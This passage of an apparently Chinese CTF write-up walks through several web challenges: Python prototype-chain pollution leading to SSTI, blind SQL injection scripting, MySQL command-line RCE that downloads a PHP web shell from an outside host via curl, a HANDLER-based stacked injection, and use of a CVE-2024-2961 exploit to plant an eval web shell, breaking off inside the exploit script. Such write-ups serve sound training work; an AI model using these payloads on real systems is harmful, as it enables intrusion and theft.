        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/magic'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">pollute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>
            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token string">"这个魔术还行吧"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"我要json的魔术"</span>
    <span class="token keyword">return</span> <span class="token string">"记得用POST方法把魔术交上来"</span></code></pre>

<p>这里对应的merge函数就是python中对属性值控制的一个操作，我们来简单的解释一下：merge中我们结合nodejs的merge来理解，就是将源参数赋值到目标参数。</p>
<p>然后对src中的键值对进行了遍历，然后检查dst中是否含有<code>__getitem__</code>属性，以此来判断dst是否为字典。如果存在的话，检测dst中是否存在属性k且value是否是一个字典，如果是的话，就继续嵌套merge对内部的字典再进行遍历，将对应的每个键值对都取出来。如果不存在的话就将src中的value的值赋值给dst对应的key的值。</p>
<p>如果dst不含有getitem属性的话，那就说明dst不是一个字典，就直接检测dst中是否存在k的属性，并检测该属性值是否为字典，如果是的话就再通过merge函数进行遍历，将k作为dst，v作为src，继续取出v里面的键值对进行遍历。</p>
<p><strong>所以在&#x2F;magic路由下污染jinja的语法标识符，将”,“修改为”&lt;&lt;”,”&gt;&gt;”或者其他不影响ssti注入的符号，具体内容如下，传入后去&#x2F;index进行无过滤的ssti注入即可</strong></p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"app"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                    <span class="token property">"jinja_env"</span> <span class="token operator">:</span><span class="token punctuation">&#123;</span>
<span class="token property">"variable_start_string"</span> <span class="token operator">:</span> <span class="token string">"&lt;&lt;"</span><span class="token punctuation">,</span><span class="token property">"variable_end_string"</span><span class="token operator">:</span><span class="token string">">>"</span>
<span class="token punctuation">&#125;</span>        
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>修改后正常ssti即可 大部分都没有ban</p>
<p>Payload:</p>
<pre class="language-php" data-language="php"><code class="language-php">flag<span class="token operator">=</span><span class="token operator">&lt;&lt;</span>cycler<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token operator">.</span>os<span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span></code></pre>

<h4 id="Lucky-Number-原型链污染plus"><a href="#Lucky-Number-原型链污染plus" class="headerlink" title="Lucky Number(原型链污染plus)"></a>Lucky Number(原型链污染plus)</h4><p>访问flag目录得到</p>
<pre class="language-python" data-language="python"><code class="language-python">你不会以为这里真的有flag吧？

想要flag的话先提交我的幸运数字<span class="token number">5346</span>

但是我的主人觉得我泄露了太多信息，就把我的幸运数字给删除了

但是听说在heaven中有一种create方法，配合__kwdefaults__可以创造出任何事物，你可以去<span class="token operator">/</span>m4G1c里尝试着接触到这个方法

下面是前人留下来的信息，希望对你有用

<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template_string<span class="token punctuation">,</span>render_template
<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template
<span class="token keyword">import</span> json
<span class="token keyword">import</span> heaven
<span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v
        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span>

BLACKLIST_IN_index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">is_json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/m4G1c'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">pollute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>
            merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> instance<span class="token punctuation">)</span>
            result <span class="token operator">=</span> heaven<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span>
            message <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span>
            <span class="token keyword">return</span> "这个魔术还行吧
" <span class="token operator">+</span> message
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"我要json的魔术"</span>
    <span class="token keyword">return</span> <span class="token string">"记得用POST方法把魔术交上来"</span>


<span class="token comment">#heaven.py</span>

<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>kon<span class="token operator">=</span><span class="token string">"Kon"</span><span class="token punctuation">,</span> pure<span class="token operator">=</span><span class="token string">"Pure"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> confirm<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> confirm <span class="token keyword">and</span> <span class="token string">"lucky_number"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> <span class="token string">"nope"</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> confirm <span class="token keyword">and</span> <span class="token string">"lucky_number"</span> <span class="token keyword">in</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"这是你的lucky_number，请拿好，去/check下检查一下吧"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> create<span class="token punctuation">.</span>__kwdefaults__<span class="token punctuation">[</span><span class="token string">"lucky_number"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"你有什么想创造的吗？"</span><span class="token punctuation">,</span> <span class="token string">"lucky_number"</span><span class="token punctuation">:</span> <span class="token string">"nope"</span><span class="token punctuation">&#125;</span>

</code></pre>

<p>进入题目，根据提示之间前往**&#x2F;flag<strong>，可以得到部分源码以及提示。根据代码可知在</strong>&#x2F;m4G1c<strong>路由下存在着导致原型链污染的</strong>merge<strong>函数，再结合其它提示可知此处是要污染</strong>heaven.py<strong>的</strong>create<strong>函数的</strong><strong>kwdefaults</strong><strong>属性，该属性存储的是仅关键字参数，即位于</strong><em><strong>之后的参数。由于</strong>create</em><em>函数在另一个模块中，我们需要利用<strong>sys</strong>模块的<strong>modules</strong>属性来获取到<strong>heaven.py</strong>，但是代码中并没有导入<strong>sys</strong>模块。那么该怎么获取到这个模块呢？在python中存在着*</em><strong>spec</strong><strong>内置属性，包含了关于类加载时的信息，定义在Lib&#x2F;importlib&#x2F;_bootstrap.py的类ModuleSpec，所以可以直接采用</strong>&lt;模块名&gt;.<strong>spec</strong>.<strong>init</strong>.<strong>globals</strong>[‘sys’]**获取到sys模块，此处就可以使用json模块获取，最终的payload如下</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"__init__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
        <span class="token property">"__globals__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token property">"json"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
                <span class="token property">"__spec__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
                    <span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                            <span class="token property">"sys"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                                <span class="token property">"modules"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                                    <span class="token property">"heaven"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                                        <span class="token property">"create"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                                              <span class="token property">"__kwdefaults__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                                              <span class="token property">"confirm"</span> <span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
                                              <span class="token property">"lucky_number"</span> <span class="token operator">:</span> <span class="token string">"5346"</span>
                                             <span class="token punctuation">&#125;</span> 
                                        <span class="token punctuation">&#125;</span>
                                    <span class="token punctuation">&#125;</span>
                                <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>成功污染后去指定目录进行常规的ssti注入即可</p>
<pre class="language-json" data-language="json"><code class="language-json">flag=<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler.__init__.__globals__.os.popen('cat /flag').read()<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<h4 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select|;|@|\n/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有sql注入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有RCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//flag in ctf.flag</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select '没有select，让你执行一句又如何';"</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 没有select，让你执行一句又如何 没有select，让你执行一句又如何 </span></code></pre>

<p>虽然ban了select 但是可以使用show来查看表名和列名</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">tables</span> <span class="token comment"># Tables_in_ctf flag </span>
<span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> flag <span class="token comment"># id data</span></code></pre>

<p>使用语句<code>delete from flag where data like &#39;f%&#39; and sleep(5)</code>来进行注入，如果like成功匹配到，and字段会对后面的语句进行处理，如果like匹配不到（返回false）and后语句则不会进行处理，因为sleep()函数返回值为null，因此整个where的判断永假</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

url <span class="token operator">=</span> <span class="token string">"http://challenge.basectf.fun:37210/"</span>
sqlstr <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> <span class="token string">"&#123;&#125;"</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> sqlstr<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"delete from flag where data like '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>s<span class="token punctuation">&#125;</span></span><span class="token string">%' and sleep(5)"</span></span>
        params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"sql"</span><span class="token punctuation">:</span> payload
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            flag <span class="token operator">+=</span> s
            <span class="token keyword">break</span>
</code></pre>

<h4 id="RCE-or-Sql-Inject-mysql"><a href="#RCE-or-Sql-Inject-mysql" class="headerlink" title="RCE or Sql Inject(mysql ? )"></a>RCE or Sql Inject(mysql ? )</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/se|ec|;|@|del|into|outfile/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有sql注入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有RCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ctfer<span class="token operator">!</span> You can<span class="token string single-quoted-string">'t succeed this time! hahaha ctfer! You can'</span>t succeed this time<span class="token operator">!</span> hahaha </span></code></pre>

<p>相比上一道题多过滤了se，ec，del，into，outfile。但是把换行放出来了。并且题目的语句多了个注释在末尾。</p>
<p>题目是一个比较冷门的考点，mysql命令行程序的命令执行，常见于mysql有suid时的提权</p>
<p>hint3中提示输个问号看看，先换行逃过注释，然后一个?也就是<code>sql=%0a?</code></p>
<p><img src="sql2.png" loading="lazy"></p>
<p>所以可以使用system进行rce了，但flag不在根目录，下个马进来好了</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>sql<span class="token operator">=</span><span class="token operator">%</span><span class="token number">0</span>asystem curl hsad<span class="token operator">.</span>xyz<span class="token operator">/</span>hsad<span class="token operator">.</span>txt <span class="token operator">-</span>o hsad<span class="token operator">.</span>php</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">hsad</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'mysql -u root -p123456 -e "use ctf;show tables;select * from flag"'</span><span class="token punctuation">)</span></code></pre>

<p>也可以直接env就有flag</p>
<h4 id="Sql-Inject-or-RCE-delimiter-handler"><a href="#Sql-Inject-or-RCE-delimiter-handler" class="headerlink" title="Sql Inject or RCE(delimiter handler)"></a>Sql Inject or RCE(delimiter handler)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/se|ec|st|;|@|delete|into|outfile/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有sql注入"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/"|\$|`|\\\\/i'</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你知道的，不可能有RCE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"mysql -u root -p123456 -e \"use ctf;select 'ctfer! You can\\'t succeed this time! hahaha'; -- "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\""</span><span class="token punctuation">;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ctfer<span class="token operator">!</span> You can<span class="token string single-quoted-string">'t succeed this time! hahaha ctfer! You can'</span>t succeed this time<span class="token operator">!</span> hahaha </span></code></pre>

<p>加了<code>st</code>过滤 不能使用system了，并且del换成了delete。所以关键点会在del上吗<del>（存疑，</del>确信</p>
<p>发现mysql的内置命令里面有一条正好和del有关<code>delimiter</code>。可以利用delimiter来更改一条sql语句的结束符</p>
<p><img src="sql3.png" loading="lazy"></p>
<p>那么这道题就可以用这种方法来打堆叠注入，由于select被禁用无法查看flag，可以使用handler读表的方式来绕过，需要注意的是handler读的时候read first中first被禁用，可以使用read next来绕过</p>
<p>Payload:</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">?sql&#x3D;%0adelimiter hsad%0ahandler flag openhsad%0ahandler flag read next</code></pre>

<p><strong>handler</strong></p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 打开一个表名为 tbl_name 的表的句柄
HANDLER tbl_name OPEN [ [AS] alias]

# 1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览
HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]

# 2、通过索引查看表
# FIRST: 获取第一行（索引最小的一行）
# NEXT: 获取下一行
# PREV: 获取上一行
# LAST: 获取最后一行（索引最大的一行）
HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;
    [ WHERE where_condition ] [LIMIT ... ]

# 3、不通过索引查看表
# READ FIRST: 获取句柄的第一行
# READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）
# 最后一行执行之后再执行 READ NEXT 会返回一个空的结果
HANDLER tbl_name READ &#123; FIRST | NEXT &#125;
    [ WHERE where_condition ] [LIMIT ... ]

# 关闭已打开的句柄
HANDLER tbl_name CLOSE
</code></pre>

<h4 id="Just-Readme-前置-CVE-2024-2961"><a href="#Just-Readme-前置-CVE-2024-2961" class="headerlink" title="Just Readme (前置)(CVE-2024-2961)"></a>Just Readme (前置)(CVE-2024-2961)</h4><p>Hint:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p><a target="_blank" rel="noopener" href="https://github.com/ambionics/cnext-exploits">CVE-2024-2961</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python3 cnext-exploit.py http://challenge.basectf.fun:44169/ <span class="token string">"echo '&lt;?php eval(\<span class="token variable">$_POST</span>[0]);?>'>/var/www/html/hsad.php;"</span></code></pre>

<p><strong>cnext-exploit.py</strong></p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token comment">#</span>
<span class="token comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span>
<span class="token comment"># Date: 2024-05-27</span>
<span class="token comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span>
<span class="token comment">#</span>
<span class="token comment"># TODO Parse LIBC to know if patched</span>
<span class="token comment">#</span>
<span class="token comment"># INFORMATIONS</span>
<span class="token comment">#</span>
<span class="token comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span>
<span class="token comment">#</span>

<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations

<span class="token keyword">import</span> base64
<span class="token keyword">import</span> zlib

<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>


HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>
BUG <span class="token operator">=</span> <span class="token string">"劄"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    &lt;?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url
        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>

